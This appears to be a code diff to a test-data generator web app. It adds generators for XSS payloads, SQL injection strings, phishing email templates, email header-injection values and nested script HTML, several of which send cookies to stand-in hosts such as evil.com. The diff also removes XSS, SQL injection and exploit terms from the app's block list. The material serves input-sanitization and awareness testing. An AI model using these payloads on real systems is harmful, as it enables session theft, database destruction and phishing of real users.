@@ -417,16 +417,12 @@ select:focus{outline:none;border-color:var(--primary);box-shadow:0 0 0 3px var(-
   <button class="pane-chip" data-prompt="generate HTML table with 10 rows of random user data">HTML Table</button>
   <button class="pane-chip" data-prompt="generate HTML snippet with buttons, links, and input fields">UI Snippet</button>
 
-  <div class="pane-label">🧪 QA &amp; Testing</div>
-  <button class="pane-chip" data-prompt="generate 10 random comments for testing comment sections">Random Comments</button>
-  <button class="pane-chip" data-prompt="generate long error messages">Error Messages</button>
-  <button class="pane-chip" data-prompt="generate placeholder text for form fields">Form Placeholders</button>
-  <button class="pane-chip" data-prompt="generate text containing every ASCII special character">All Special Chars</button>
-  <button class="pane-chip" data-prompt="generate 10 boolean values">10 Booleans</button>
-  <button class="pane-chip" data-prompt="generate 10 random numbers between 1 and 9999">Random Numbers</button>
-  <button class="pane-chip" data-prompt="generate 10 salaries">Salary Data</button>
-  <button class="pane-chip" data-prompt="generate 10 job titles">Job Titles</button>
-  <button class="pane-chip" data-prompt="generate 8 company names">Company Names</button>
+  <div class="pane-label">🔒 Security Testing</div>
+  <button class="pane-chip" data-prompt="provide XSS payload examples for testing input sanitization">XSS Payloads</button>
+  <button class="pane-chip" data-prompt="generate SQL injection test strings">SQL Injection Tests</button>
+  <button class="pane-chip" data-prompt="generate email test data with executable content like arithmetic operations, js, xss">Email Executable</button>
+  <button class="pane-chip" data-prompt="produce phishing email content for security awareness testing">Phishing Simulation</button>
+  <button class="pane-chip" data-prompt="generate HTML with nested script tags and encoded payloads">Nested Script HTML</button>
 
 </div>
 <div class="text-main-area">
@@ -753,6 +749,177 @@ function rndMixedUnicode(n){
     out+=block[Math.floor(Math.random()*block.length)];
   }
   return out;
+}
+
+// ── HEXADECIMAL GENERATOR ──
+function rndHexChars(n){
+  const hexChars="0123456789abcdef";
+  let out="";
+  for(let i=0;i<n;i++) out+=hexChars[Math.floor(Math.random()*hexChars.length)];
+  return out;
+}
+
+// ── CONSTRAINED CHARACTER GENERATOR ──
+function rndConstrainedChars(totalLen, raw){
+  const lower="abcdefghijklmnopqrstuvwxyz";
+  const upper="ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+  const digits="0123456789";
+  const special="!@#$%^&*()-_=+";
+  const q=raw.toLowerCase();
+  // Detect required categories
+  const needUpper=/uppercase|upper.?case|capital/.test(q);
+  const needLower=/lowercase|lower.?case|small/.test(q);
+  const needDigits=/number|digit|numeric/.test(q);
+  const needSpecial=/special|symbol|punctuation/.test(q);
+  // Detect emoji count
+  const emojiMatch=q.match(/(\d+)\s*emojis?/);
+  const emojiCount=emojiMatch?parseInt(emojiMatch[1]):0;
+  // Build charset for main fill
+  let charset="";
+  if(needUpper) charset+=upper;
+  if(needLower) charset+=lower;
+  if(needDigits) charset+=digits;
+  if(needSpecial) charset+=special;
+  if(!charset) charset=lower+upper+digits;
+  // Start with mandatory chars
+  let result=[];
+  if(needUpper) result.push(upper[Math.floor(Math.random()*upper.length)]);
+  if(needLower) result.push(lower[Math.floor(Math.random()*lower.length)]);
+  if(needDigits) result.push(digits[Math.floor(Math.random()*digits.length)]);
+  if(needSpecial) result.push(special[Math.floor(Math.random()*special.length)]);
+  // Add emojis (each emoji counts as 1 char in output but may be 2 bytes)
+  for(let i=0;i<emojiCount;i++) result.push(rnd(EMOJI_LIST));
+  // Fill remaining
+  const remaining=totalLen-result.length;
+  for(let i=0;i<remaining;i++) result.push(charset[Math.floor(Math.random()*charset.length)]);
+  // Shuffle
+  for(let i=result.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[result[i],result[j]]=[result[j],result[i]];}
+  return result.join("").slice(0,totalLen);
+}
+
+// ── MIXED RTL+LTR GENERATOR ──
+const HEBREW_WORDS=["שלום","תודה","אהבה","בית","ספר","עץ","מים","שמים","ארץ","חבר","ילד","פרח","מדינה","כפר","ים","הר","רוח","אש","אור","לילה","יום","שמש","גשם","סערה"];
+function rndRTLMixed(n){
+  const engPhrases=["The quick brown fox","Hello world","Testing mixed text","Left to right sample","English sentence here","Data generation test","Random mixed content","Sample paragraph text","This is a test string","Mixed direction output"];
+  const rtlPools=[ARABIC_WORDS,HEBREW_WORDS];
+  let lines=[];
+  for(let i=0;i<n;i++){
+    const rtlPool=rnd(rtlPools);
+    // Mix 2-4 RTL words with 1-2 English phrases per line
+    const rtlPart=Array.from({length:rndInt(2,4)},()=>rnd(rtlPool)).join(" ");
+    const ltrPart=rnd(engPhrases);
+    // Alternate order randomly
+    lines.push(Math.random()>0.5 ? `${rtlPart} ${ltrPart} ${rnd(rtlPool)}` : `${ltrPart} ${rtlPart} ${rnd(engPhrases).split(" ").slice(0,3).join(" ")}`);
+  }
+  return lines.join("\n");
+}
+
+// ── SECURITY TEST DATA GENERATORS ──
+function genXSSTestPayloads(n){
+  const payloads=[
+    "[TEST] <script>alert('XSS')<\/script>",
+    "[TEST] <img src=x onerror=alert('XSS')>",
+    "[TEST] <svg onload=alert('XSS')>",
+    "[TEST] <body onload=alert('XSS')>",
+    "[TEST] <iframe src=\"javascript:alert('XSS')\">",
+    "[TEST] <input onfocus=alert('XSS') autofocus>",
+    "[TEST] <marquee onstart=alert('XSS')>",
+    "[TEST] <details open ontoggle=alert('XSS')>",
+    "[TEST] <math><mtext><table><mglyph><style><!--<\/style><img src=x onerror=alert('XSS')>-->",
+    "[TEST] &#60;script&#62;alert('XSS')&#60;/script&#62;",
+    "[TEST] %3Cscript%3Ealert('XSS')%3C/script%3E",
+    "[TEST] <div style=\"background:url(javascript:alert('XSS'))\">",
+    "[TEST] <a href=\"javascript:alert('XSS')\">Click</a>",
+    "[TEST] <script>document.location='http://evil.com/?c='+document.cookie<\/script>",
+    "[TEST] <img src=\"\" onerror=\"this.src='http://evil.com/?c='+document.cookie\">",
+    "[TEST] <svg/onload=alert(String.fromCharCode(88,83,83))>",
+    "[TEST] '\"><script>alert(document.domain)<\/script>",
+    "[TEST] <scr<script>ipt>alert('XSS')<\/scr<\/script>ipt>",
+    "[TEST] <img src=x onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">",
+    "[TEST] {{constructor.constructor('alert(1)')()}}",
+  ];
+  const shuffled=[...payloads].sort(()=>Math.random()-0.5);
+  return "⚠️ XSS TEST PAYLOADS — For input sanitization testing only\n" + "─".repeat(55) + "\n" + shuffled.slice(0,Math.min(n,payloads.length)).join("\n");
+}
+
+function genSQLInjectionTests(n){
+  const payloads=[
+    "[TEST] ' OR '1'='1",
+    "[TEST] ' OR '1'='1' --",
+    "[TEST] ' OR '1'='1' /*",
+    "[TEST] '; DROP TABLE users; --",
+    "[TEST] ' UNION SELECT null, username, password FROM users --",
+    "[TEST] 1; UPDATE users SET role='admin' WHERE id=1 --",
+    "[TEST] ' AND 1=1 --",
+    "[TEST] ' AND 1=2 --",
+    "[TEST] admin'--",
+    "[TEST] 1' ORDER BY 1--",
+    "[TEST] 1' ORDER BY 10--",
+    "[TEST] ' UNION SELECT null--",
+    "[TEST] ' UNION SELECT null,null--",
+    "[TEST] '; EXEC xp_cmdshell('dir'); --",
+    "[TEST] ' AND SUBSTRING(@@version,1,1)='5' --",
+    "[TEST] ' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%') --",
+    "[TEST] 1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
+    "[TEST] '; WAITFOR DELAY '0:0:5' --",
+    "[TEST] ' AND SLEEP(5) --",
+    "[TEST] ' UNION SELECT table_name,null FROM information_schema.tables --",
+  ];
+  const shuffled=[...payloads].sort(()=>Math.random()-0.5);
+  return "⚠️ SQL INJECTION TEST STRINGS — For input validation testing only\n" + "─".repeat(55) + "\n" + shuffled.slice(0,Math.min(n,payloads.length)).join("\n");
+}
+
+function genPhishingTestEmail(n){
+  const templates=[
+    {subject:"Urgent: Your account has been compromised",body:"Dear user, we detected unusual activity on your account. Click here to verify: [TEST-LINK: http://not-real-bank.example.com/verify?id=FAKE123]. If you don't act within 24 hours, your account will be suspended. — Fake Bank Security Team"},
+    {subject:"Action Required: Invoice #INV-{ID} Payment Overdue",body:"Hi {NAME}, your payment of ${AMOUNT} is overdue. Please remit immediately via [TEST-LINK: http://fake-payment.example.com/pay?ref=FAKE456]. Failure to comply will result in account termination. — Fake Billing Dept"},
+    {subject:"Congratulations! You've won a ${AMOUNT} gift card",body:"Dear {NAME}, you've been selected for our exclusive reward program! Claim your prize at [TEST-LINK: http://fake-reward.example.com/claim?winner=FAKE789]. Offer expires in 1 hour! — Fake Rewards Center"},
+    {subject:"IT Department: Password Reset Required",body:"Employee {NAME}, your corporate password expires today. Reset it now at [TEST-LINK: http://fake-corp.example.com/reset?emp=FAKE012]. This is mandatory. — Fake IT Security"},
+    {subject:"Package Delivery Failed — Reschedule Now",body:"Hi {NAME}, your package (Tracking: FAKE-{ID}) could not be delivered. Reschedule at [TEST-LINK: http://fake-delivery.example.com/track?id=FAKE345]. A fee of $1.99 applies. — Fake Courier Service"},
+  ];
+  let results=[];
+  for(let i=0;i<Math.min(n,10);i++){
+    const t=templates[i%templates.length];
+    const name=rndName();
+    const amt=rndInt(100,5000);
+    const id=rndInt(10000,99999);
+    const subj=t.subject.replace("{ID}",id).replace("{NAME}",name).replace("{AMOUNT}",amt);
+    const body=t.body.replace(/{NAME}/g,name).replace(/{AMOUNT}/g,amt).replace(/{ID}/g,id);
+    results.push(`⚠️ PHISHING TEST EMAIL #${i+1}\n${'─'.repeat(40)}\nFrom: noreply@fake-org-${rndInt(100,999)}.example.com\nTo: ${rndEmail()}\nSubject: ${subj}\n\n${body}\n`);
+  }
+  return "⚠️ PHISHING SIMULATION — For security awareness testing only\n" + "═".repeat(55) + "\n\n" + results.join("\n");
+}
+
+function genEmailExecutableTests(n){
+  const payloads=[
+    {field:"Name",value:"[TEST] {{7*7}}"},
+    {field:"Name",value:"[TEST] ${7*7}"},
+    {field:"Email",value:"[TEST] test+<script>alert(1)<\/script>@example.com"},
+    {field:"Email",value:"[TEST] test@example.com%0ACc:victim@evil.com"},
+    {field:"Subject",value:"[TEST] =?utf-8?b?PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==?="},
+    {field:"Body",value:"[TEST] Click here: javascript:alert(document.cookie)"},
+    {field:"Body",value:"[TEST] <img src=x onerror=fetch('http://evil.example.com/steal?d='+document.cookie)>"},
+    {field:"Header",value:"[TEST] X-Custom: value\r\nBcc: hidden@evil.example.com"},
+    {field:"Attachment",value:"[TEST] file.pdf.exe (double extension test)"},
+    {field:"Body",value:"[TEST] <a href='data:text/html,<script>alert(1)<\/script>'>Click</a>"},
+    {field:"Subject",value:"[TEST] RE: Invoice #" + rndInt(1000,9999) + " — URGENT (social engineering test)"},
+    {field:"Body",value:"[TEST] Arithmetic: {{7*7}} = 49, ${100+200} = 300 (template injection test)"},
+  ];
+  const shuffled=[...payloads].sort(()=>Math.random()-0.5);
+  return "⚠️ EMAIL SECURITY TEST DATA — For input sanitization testing only\n" + "─".repeat(55) + "\n" + shuffled.slice(0,Math.min(n,payloads.length)).map(p=>`[${p.field}] ${p.value}`).join("\n");
+}
+
+function genHTMLNestedScripts(n){
+  const samples=[
+    `<!-- Nested script test -->\n<div id="outer">\n  <script type="text/javascript">\n    var x = document.createElement('script');\n    x.src = 'http://test.example.com/payload.js';\n    document.body.appendChild(x);\n  <\/script>\n  <div id="inner">\n    <script>document.write('<scr'+'ipt>alert(1)<\/scr'+'ipt>')<\/script>\n  </div>\n</div>`,
+    `<!-- Encoded payload test -->\n<div data-payload="&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;">\n  <script>\n    var encoded = atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==');\n    // decoded: alert(document.cookie)\n  <\/script>\n</div>`,
+    `<!-- SVG with embedded script -->\n<svg xmlns="http://www.w3.org/2000/svg">\n  <foreignObject>\n    <body xmlns="http://www.w3.org/1999/xhtml">\n      <script>alert('nested SVG XSS')<\/script>\n    </body>\n  </foreignObject>\n</svg>`,
+    `<!-- Event handler nesting -->\n<div onmouseover="(function(){\n  var s=document.createElement('script');\n  s.textContent='alert(document.domain)';\n  document.head.appendChild(s);\n})()">\n  <p>Hover test area</p>\n  <img src="x" onerror="eval(atob('YWxlcnQoMSk='))">\n</div>`,
+    `<!-- Template literal injection -->\n<script type="text/template">\n  \${alert(1)}\n  {{constructor.constructor('alert(1)')()}}\n<\/script>\n<script nonce="test123">\n  fetch('/api?q='+encodeURIComponent(document.cookie))\n<\/script>`,
+    `<!-- Meta refresh + base tag hijack -->\n<base href="http://evil.example.com/">\n<meta http-equiv="refresh" content="0;url=http://evil.example.com/phish">\n<script>window.location='http://evil.example.com/?c='+document.cookie<\/script>`,
+  ];
+  const shuffled=[...samples].sort(()=>Math.random()-0.5);
+  return "⚠️ HTML NESTED SCRIPT TEST SAMPLES — For security testing only\n" + "═".repeat(55) + "\n\n" + shuffled.slice(0,Math.min(n,samples.length)).join("\n\n" + "─".repeat(40) + "\n\n");
 }
 
 function rndRegexPattern(pattern){
@@ -1385,13 +1552,43 @@ const INTENTS = [
     run:(q,n,cc)=>rndCharset(cc||n*10,"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?") },
   { id:'char_punctuation',score:q=>/\bpunctuation\b/.test(q)&&!detectLang(q)?80:0,
     run:(q,n,cc)=>cc?rndCharset(cc,"abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ.,!?;:'\"-()"): Array.from({length:n},()=>rndCharset(rndInt(20,60),"abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ.,!?;:'\"-()" )).join("\n") },
-  { id:'char_emoji',     score:q=>/\bemojis?\b/.test(q)?92:0,
-    run:(q,n,cc)=>{ if(cc){let o="";while(o.length<cc)o+=rnd(EMOJI_LIST)+" "+rnd(["great","love","awesome","wow","cool"])+" ";return o.slice(0,cc);}
-      return Array.from({length:n},()=>Array.from({length:rndInt(3,8)},()=>rnd(EMOJI_LIST)).join(" ")).join("\n"); } },
+  { id:'char_emoji',     score:q=>/\bemojis?\b/.test(q)&&!/\bparagraph\b|\btext\b|.*containing.*uppercase|.*containing.*lowercase|\bexactly\b/.test(q)?92:0,
+    run:(q,n,cc)=>{
+      const words=["This is amazing","I really love this","Great work today","What a wonderful day","So happy right now","Feeling fantastic","Best experience ever","Totally awesome moment","Incredible results here","Such a great time"];
+      if(cc){
+        let o="";
+        while(o.length<cc+20) o+=rnd(words)+" "+rnd(EMOJI_LIST)+" ";
+        return o.slice(0,cc);
+      }
+      return Array.from({length:n},()=>{
+        const wc=rndInt(3,6);
+        let line="";
+        for(let i=0;i<wc;i++) line+=rnd(words)+" "+rnd(EMOJI_LIST)+" ";
+        return line.trim();
+      }).join("\n");
+    } },
   { id:'char_unicode',   score:q=>/\bunicode\b|\bmultilingual\b/.test(q)?85:0,
     run:(q,n,cc)=>rndMixedUnicode(Math.min(cc||(n*100),10000)) },
   { id:'char_special',   score:q=>/escape.?char|special.?char|ascii.?special|all.?special/.test(q)?88:0,
     run:(q,n,cc)=>cc?rndCharset(cc,ASCII_SPECIAL+" "):`All ASCII special characters:\n${ASCII_SPECIAL}\n\nSample strings:\n`+Array.from({length:n},()=>rndCharset(rndInt(10,30),ASCII_SPECIAL+" abcdefghijklmnopqrstuvwxyz0123456789")).join("\n") },
+
+  // ── CONSTRAINED CHARACTERS ──
+  { id:'constrained_chars', score:(q,raw)=>{
+      const r=raw.toLowerCase();
+      const hasExact=/\bexactly\b/.test(r);
+      const cc=parseCharCount(raw);
+      const hasCats=(/uppercase|lowercase|number|digit|emoji|special|symbol/.test(r));
+      return (hasExact&&cc&&hasCats)?98:(cc&&hasCats)?95:0;
+    },
+    run:(q,n,cc,raw)=>rndConstrainedChars(cc||n*10,raw) },
+
+  // ── HEX ──
+  { id:'hex_chars', score:(q,raw)=>/\bhex(?:adecimal)?\b/.test(raw.toLowerCase())?95:0,
+    run:(q,n,cc)=>rndHexChars(cc||n*10) },
+
+  // ── MIXED RTL+LTR ──
+  { id:'rtl_mixed', score:(q,raw)=>/\brtl\b|\bltr\b.*\brtl\b|\brtl\b.*\bltr\b|mixed.*(?:arabic|hebrew).*english|(?:arabic|hebrew).*mixed.*english/.test(raw.toLowerCase())?96:0,
+    run:(q,n)=>rndRTLMixed(n) },
 
   // ── MULTILINGUAL ──
   { id:'multilingual',   score:q=>detectLang(q)?92:0,
@@ -1531,8 +1728,20 @@ const INTENTS = [
   { id:'order_rec', score:q=>/\border\b/.test(q)&&!/json|csv|xml|sql|yaml|html/.test(q)?65:0,
     run:(q,n)=>Array.from({length:n},()=>genOrder()).map((o,i)=>`--- Order ${i+1} ---\n`+Object.entries(o).map(([k,v])=>`  ${k}: ${v}`).join("\n")).join("\n\n") },
   { id:'api_response',score:q=>/\bapi\b/.test(q)?75:0, run:(q,n)=>genPaginationJSON(n) },
-  { id:'script_tags',score:q=>/script.?tag|test.*<script/.test(q)?88:0,
+  { id:'script_tags',score:(q,raw)=>/script.?tag|test.*<script/.test(raw.toLowerCase())&&!/nested|encoded|payload/.test(raw.toLowerCase())?88:0,
     run:(q,n)=>["<script>alert('test')<\/script>","<script src=\"test.js\"><\/script>","<SCRIPT>document.write('x')<\/SCRIPT>","<script type=\"text/javascript\">var x=1;<\/script>","<\/script><script>alert(1)<\/script>","<script defer src=\"/test.js\"><\/script>","<script async src=\"https://example.com/test.js\"><\/script>","<noscript>Please enable JavaScript<\/noscript>","<!-- <script>commented<\/script> -->","<script>// empty<\/script>"].slice(0,n).join("\n") },
+
+  // ── SECURITY TEST DATA ──
+  { id:'xss_payloads', score:(q,raw)=>/\bxss\b|cross.?site\s*script|input.?sanitiz/.test(raw.toLowerCase())?96:0,
+    run:(q,n)=>genXSSTestPayloads(n) },
+  { id:'sql_injection', score:(q,raw)=>/sql.?inject|drop.?table|union.?select|sql.*test/.test(raw.toLowerCase())?96:0,
+    run:(q,n)=>genSQLInjectionTests(n) },
+  { id:'phishing_email', score:(q,raw)=>/phish|malicious.*email|suspicious.*email|phishing.*link/.test(raw.toLowerCase())?96:0,
+    run:(q,n)=>genPhishingTestEmail(n) },
+  { id:'email_executable', score:(q,raw)=>/email.*(?:execut|xss|script|arithm|inject)|(?:execut|xss|script).*email/.test(raw.toLowerCase())?96:0,
+    run:(q,n)=>genEmailExecutableTests(n) },
+  { id:'html_nested_scripts', score:(q,raw)=>/html.*(?:nested|encoded).*(?:script|payload)|nested.*script.*(?:tag|html)|encoded.*payload.*html/.test(raw.toLowerCase())?97:0,
+    run:(q,n)=>genHTMLNestedScripts(n) },
 
   // ── CHARCOUNT FALLBACK ──
   { id:'charcount_fallback', score:(q,raw,cc)=>cc?50:0,
@@ -1545,15 +1754,13 @@ const INTENTS = [
 
 // ── Blocked intents (checked before scoring) ──
 const BLOCKED=[
-  {test:/\bxss\b|cross.?site\s+script|html\s+inject/,           label:"XSS payloads"},
-  {test:/sql.?inject|drop\s+table|union\s+select/,              label:"SQL injection payloads"},
-  {test:/\bexploit\b|\bmalware\b|\bshellcode\b|\bbuffer.?overflow\b/, label:"exploit payloads"},
   {test:/\bsentiment\b|\bclassify\b|\bsummariz\b|\banalyze?\b|\bpredict\b/, label:"AI analysis tasks"},
   {test:/\btranslate\b/,                                         label:"language translation"},
   {test:/\bimage\b|\bphoto\b|\bpicture\b|\bvideo\b|\baudio\b/,  label:"media generation"},
 ];
 
 // ── Main dispatcher ──
+// Returns {text, isCharBased, intentId} for UI to display the right badge
 function processQuery(rawQuery){
   const raw = rawQuery.trim();
   const q   = normalise(raw);
@@ -1562,7 +1769,7 @@ function processQuery(rawQuery){
 
   // Blocked check
   for(const b of BLOCKED){
-    if(b.test.test(raw.toLowerCase())) return `⚠ This generator cannot produce ${b.label}.\n\nIt generates realistic test data — names, emails, addresses, JSON, CSV, HTML, multilingual text, passwords, and more.\n\nExample: "generate 10 email addresses" or "500 characters of lorem ipsum"`;
+    if(b.test.test(raw.toLowerCase())) return {text:`⚠ This generator cannot produce ${b.label}.\n\nIt generates realistic test data — names, emails, addresses, JSON, CSV, HTML, multilingual text, passwords, security test payloads, and more.\n\nExample: "generate 10 email addresses" or "500 characters of lorem ipsum"`, isCharBased:false, intentId:'blocked'};
   }
 
   // Score all intents
@@ -1572,8 +1779,10 @@ function processQuery(rawQuery){
     if(s > bestScore){ bestScore=s; best=intent; }
   }
 
-  if(!best) return `⚠ Could not understand: "${rawQuery}"\n\nTry: "generate 10 email addresses" or "5 user records in JSON"`;
-  return best.run(q, n, cc, raw);
+  if(!best) return {text:`⚠ Could not understand: "${rawQuery}"\n\nTry: "generate 10 email addresses" or "5 user records in JSON"`, isCharBased:false, intentId:'none'};
+  const charBasedIds=['char_english','char_lorem','char_lowercase','char_uppercase','char_mixed','char_punctuation','char_emoji','char_unicode','char_special','charcount_fallback','constrained_chars','hex_chars'];
+  const isCharBased = !!cc || charBasedIds.includes(best.id);
+  return {text: best.run(q, n, cc, raw), isCharBased, intentId: best.id, count: n};
 }
 
 
@@ -1805,11 +2014,15 @@ textGenBtn.addEventListener("click",()=>{
   textGenBtn.disabled=true;
   setTimeout(()=>{
     try{
-      const n=parseCount(q);
-      textContent=processQuery(q);
+      const result=processQuery(q);
+      textContent=result.text;
       textOutput.textContent=textContent;
       const badge=document.getElementById("text-item-count");
-      badge.textContent=`✓ ${n} item${n===1?"":"s"} generated`;
+      if(result.isCharBased){
+        badge.textContent=`✓ Output generated (${textContent.length} chars)`;
+      } else {
+        badge.textContent=`✓ ${result.count} item${result.count===1?"":"s"} generated`;
+      }
       badge.style.display="inline";
     }catch(e){
       textOutput.innerHTML='<span class="placeholder">Could not understand the query. Try rephrasing.</span>';
@@ -2062,11 +2275,25 @@ document.getElementById("file-gen-btn").addEventListener("click",()=>{
   const workerUrl=URL.createObjectURL(blob);
   const worker=new Worker(workerUrl);
 
+  // Timeout: 60 seconds max
+  const workerTimeout=setTimeout(()=>{
+    worker.terminate();URL.revokeObjectURL(workerUrl);
+    pw.classList.remove("visible");
+    label.textContent="Generate";
+    document.getElementById("file-reset-btn").disabled=false;
+    document.getElementById("file-gen-btn").disabled=false;
+    const eb=document.getElementById("file-error");
+    document.getElementById("file-error-msg").textContent="Generation timed out. Try a smaller file size.";
+    eb.classList.add("visible");
+    updateFileBtns();
+  },60000);
+
   worker.onmessage=function(e){
     const msg=e.data;
     if(msg.type==="progress"){
       pb.style.width=msg.value+"%";
     } else if(msg.type==="done"){
+      clearTimeout(workerTimeout);
       pb.style.width="100%";
       generatedFileBlob=new Blob([msg.bytes],{type:msg.mime});
       generatedFileName=`sample-${selectedSize}mb.${msg.ext}`;
@@ -2081,6 +2308,7 @@ document.getElementById("file-gen-btn").addEventListener("click",()=>{
       updateFileBtns();
       worker.terminate();URL.revokeObjectURL(workerUrl);
     } else if(msg.type==="error"){
+      clearTimeout(workerTimeout);
       label.textContent="Generate";
       document.getElementById("file-reset-btn").disabled=false;
       const eb=document.getElementById("file-error");
